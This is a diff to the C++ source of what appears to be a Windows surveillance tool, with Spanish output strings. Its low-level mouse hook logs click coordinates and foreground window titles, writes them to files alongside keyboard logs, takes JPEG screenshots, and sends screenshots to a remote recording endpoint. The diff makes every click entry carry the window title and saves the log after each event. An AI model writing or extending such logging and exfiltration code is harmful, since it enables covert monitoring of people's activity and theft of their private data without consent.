@@ -76,30 +76,6 @@ LRESULT WINAPI MyMouseCallback(int nCode, WPARAM wParam, LPARAM lParam) {
 
 				if (currentWindow != otherWindow) {
 
-					if (mouseC.length() > 0) {
-						date.setDateInt();
-						time.setTimeInt();
-						Filetxt file = Filetxt(directory.getPathKeyboard(), directory.getPathMouse());
-						std::string image = date.getNumbers() + "-" + time.getNumbers() + "- WINDOW - " + myTitle;
-
-						file.saveFile(
-							"mouse",
-							date.getNumbers() + "-" + time.getNumbers() + "-" + myTitle,
-							date.getNow(),
-							time.getNow(),
-							myTitle,
-							mouseC
-						);
-
-						Screenshot screen = Screenshot(directory.getPathImage());
-						screen.saveJpeg(image);
-						std::string content = "data:image/jpeg;base64,";
-
-						mouseTitle[0] = "";
-						mouseTitle[1] = "";
-						mouseTitle[2] = "";
-					}
-
 					GetWindowTextA(GetForegroundWindow(), mTitle, _countof(mTitle));
 					myTitle = mTitle;
 
@@ -122,8 +98,6 @@ LRESULT WINAPI MyMouseCallback(int nCode, WPARAM wParam, LPARAM lParam) {
 						}
 					}
 					std::cout << "[-] " << myTitle << std::endl;
-					
-					mouseC.clear();
 					temp << " - Current Window: " << myTitle << "\n\n";
 					//outPut.append(temp.str());
 					std::cout << temp.str() << std::endl;
@@ -138,7 +112,8 @@ LRESULT WINAPI MyMouseCallback(int nCode, WPARAM wParam, LPARAM lParam) {
 				case WM_LBUTTONUP: {
 					double xPos = pMouseStruct->pt.x;
 					double yPos = pMouseStruct->pt.y;
-					mouseC += "[+] Click Izquierdo levantado: \n \t [-] x = " + std::to_string(xPos) + " | y = " + std::to_string(yPos) + "\n";
+					mouseC += "[+] Ventana = " + myTitle + "\n";
+					mouseC += "[+] Click Izquierdo levantado: \t [-] x = " + std::to_string(xPos) + " | y = " + std::to_string(yPos) + "\n";
 					break;
 				}
 				case WM_LBUTTONDOWN: {
@@ -156,18 +131,21 @@ LRESULT WINAPI MyMouseCallback(int nCode, WPARAM wParam, LPARAM lParam) {
 							post.RequestRecord(myTitle, myTitle, date.getNow(), time.getNow(), "screenshot", content, data.getID());
 						}
 					}
+					mouseC += "[+] Ventana = " + myTitle + "\n";
 					mouseC += "[+] Click Izquierdo presionado: \n \t [-] x = " + std::to_string(xPos) + " | y = " + std::to_string(yPos) + "\n";
 					break;
 				}
 				case WM_RBUTTONUP: {
 					double xPos = pMouseStruct->pt.x;
 					double yPos = pMouseStruct->pt.y;
+					mouseC += "[+] Ventana = " + myTitle + "\n";
 					mouseC += "[+] Click Derecho levantado: \n \t [-] x = " + std::to_string(xPos) + " | y = " + std::to_string(yPos) + "\n";
 					break;
 				}
 				case WM_RBUTTONDOWN: {
 					double xPos = pMouseStruct->pt.x;
 					double yPos = pMouseStruct->pt.y;
+					mouseC += "[+] Ventana = " + myTitle + "\n";
 					mouseC += "[+] Click Derecho presionado: \n \t [-] x = " + std::to_string(xPos) + " | y = " + std::to_string(yPos) + "\n";
 					break;
 				}
@@ -176,6 +154,18 @@ LRESULT WINAPI MyMouseCallback(int nCode, WPARAM wParam, LPARAM lParam) {
 				}
 				std::cout << mouseC << std::endl;
 
+				date.setDateInt();
+				time.setTimeInt();
+				Filetxt file = Filetxt(directory.getPathKeyboard(), directory.getPathMouse());
+
+				file.saveFile(
+					"mouse",
+					date.getNumbers() +" - MOUSE",
+					date.getNow(),
+					time.getNow(),
+					myTitle,
+					mouseC
+				);
 			}
 		
 	}
